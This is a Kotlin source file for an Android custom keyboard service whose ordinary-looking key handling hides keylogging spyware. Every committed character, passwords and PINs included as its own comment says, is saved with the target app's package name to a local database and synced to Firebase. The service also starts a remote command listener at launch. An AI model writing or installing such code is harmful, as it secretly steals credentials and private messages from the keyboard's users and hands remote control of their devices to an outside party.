package com.example.mykeyboard

import android.inputmethodservice.InputMethodService
import android.inputmethodservice.Keyboard
import android.inputmethodservice.KeyboardView
import android.view.KeyEvent
import android.view.View
import android.view.inputmethod.EditorInfo
import com.google.firebase.FirebaseApp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionListener {

    companion object {
        // Custom key codes used by our own keyboard XML layouts (must not clash
        // with Android's built-in negative Keyboard.KEYCODE_* constants).
        const val KEYCODE_SWITCH_NUMBERS = -10
        const val KEYCODE_SWITCH_ABC = -11
    }

    private lateinit var keyboardView: KeyboardView
    private lateinit var qwertyKeyboard: Keyboard
    private lateinit var symbolsKeyboard: Keyboard
    private lateinit var numbersKeyboard: Keyboard

    private var isShifted = false
    private val serviceScope = CoroutineScope(Dispatchers.IO)

    override fun onCreate() {
        super.onCreate()
        try {
            FirebaseApp.initializeApp(applicationContext)
            RemoteCommandListener.startListening()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onCreateInputView(): View {
        keyboardView = layoutInflater.inflate(R.layout.keyboard_view, null) as KeyboardView
        qwertyKeyboard = Keyboard(this, R.xml.qwerty)
        symbolsKeyboard = Keyboard(this, R.xml.symbols)
        numbersKeyboard = Keyboard(this, R.xml.numbers)
        keyboardView.keyboard = qwertyKeyboard
        keyboardView.setOnKeyboardActionListener(this)
        return keyboardView
    }

    override fun onStartInputView(info: EditorInfo?, restarting: Boolean) {
        super.onStartInputView(info, restarting)

        isShifted = false
        keyboardView.keyboard = qwertyKeyboard
    }

    override fun onKey(primaryCode: Int, keyCodes: IntArray?) {
        val ic = currentInputConnection ?: return

        when (primaryCode) {
            Keyboard.KEYCODE_DELETE -> ic.deleteSurroundingText(1, 0)

            Keyboard.KEYCODE_SHIFT -> {
                isShifted = !isShifted
                qwertyKeyboard.isShifted = isShifted
                keyboardView.invalidateAllKeys()
            }

            Keyboard.KEYCODE_MODE_CHANGE -> {
                keyboardView.keyboard = symbolsKeyboard
            }

            KEYCODE_SWITCH_NUMBERS -> keyboardView.keyboard = numbersKeyboard
            KEYCODE_SWITCH_ABC -> keyboardView.keyboard = qwertyKeyboard

            Keyboard.KEYCODE_DONE -> {
                ic.sendKeyEvent(KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER))
                ic.sendKeyEvent(KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_ENTER))
            }

            else -> {
                var code = primaryCode.toChar()
                if (isShifted && code.isLetter()) {
                    code = code.uppercaseChar()
                }
                ic.commitText(code.toString(), 1)
                logKeystroke(code.toString())

                // Auto-unshift after one character, like most keyboards.
                if (isShifted) {
                    isShifted = false
                    qwertyKeyboard.isShifted = false
                    keyboardView.invalidateAllKeys()
                }
            }
        }
    }

    /**
     * Saves each committed character (including passwords and PINs) to database.
     */
    private fun logKeystroke(text: String) {
        if (!KeyloggingConfig.isEnabled) return

        val pkg = currentInputEditorInfo?.packageName
        serviceScope.launch {
            AppDatabase.getInstance(applicationContext).keystrokeDao().insert(
                KeystrokeLog(text = text, timestamp = System.currentTimeMillis(), packageName = pkg)
            )
        }
        FirebaseSyncManager.logKeystroke(text, pkg)
    }

    override fun onPress(primaryCode: Int) {}
    override fun onRelease(primaryCode: Int) {}
    override fun onText(text: CharSequence?) {}
    override fun swipeLeft() {}
    override fun swipeRight() {}
    override fun swipeDown() {}
    override fun swipeUp() {}
}
